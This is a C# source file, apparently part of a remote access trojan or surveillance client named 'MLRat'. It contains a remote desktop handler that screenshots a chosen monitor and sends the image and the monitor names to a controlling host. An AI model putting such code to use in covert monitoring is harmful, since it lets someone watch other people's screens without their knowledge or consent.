using MLRat.Client;
using MLSurveillanceSharedCode.Network;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace MLSurveillanceClient.Handlers
{
    public static class RemoteDesktopHandler
    {
        private static IClientConnection NetworkHost;
        public static void SetNetworkHost(IClientConnection host)
        {
            NetworkHost = host;
        }
        public static void Handle(object[] data)
        {
            var command = (RemoteDesktopCommand)data[1];
            if (command == RemoteDesktopCommand.RequestFrame)
                NetworkHost.Send((byte)NetworkCommand.RemoteDesktop, (byte)RemoteDesktopCommand.Frame, TakeScreenshot((int)data[2]));
            if (command == RemoteDesktopCommand.GetMonitors && Screen.AllScreens != null && Screen.AllScreens.Length > 0)
                NetworkHost.Send((byte)NetworkCommand.RemoteDesktop, (byte)RemoteDesktopCommand.MonitorResponce, Screen.AllScreens.Select(s => s.DeviceName).ToArray());
        }

        private static byte[] TakeScreenshot(int monitor)
        {
            Screen selectedMonitor;
            if (monitor == -1 || monitor > Screen.AllScreens.Length-1)
                selectedMonitor = Screen.PrimaryScreen;
            else
                selectedMonitor = Screen.AllScreens[monitor];
            using (var bmp = new Bitmap(selectedMonitor.Bounds.Width, selectedMonitor.Bounds.Height))
            {
                var g = Graphics.FromImage(bmp);
                g.CopyFromScreen(selectedMonitor.Bounds.X, selectedMonitor.Bounds.Y, 0, 0, selectedMonitor.Bounds.Size);
                //g.CopyFromScreen(0, 0, 0, 0, selectedMonitor.Bounds.Size);
                g.Dispose();
                using (var ms = new MemoryStream())
                {
                    bmp.Save(ms, ImageFormat.Png);
                    return ms.ToArray();
                }
            }
        }
    }
}
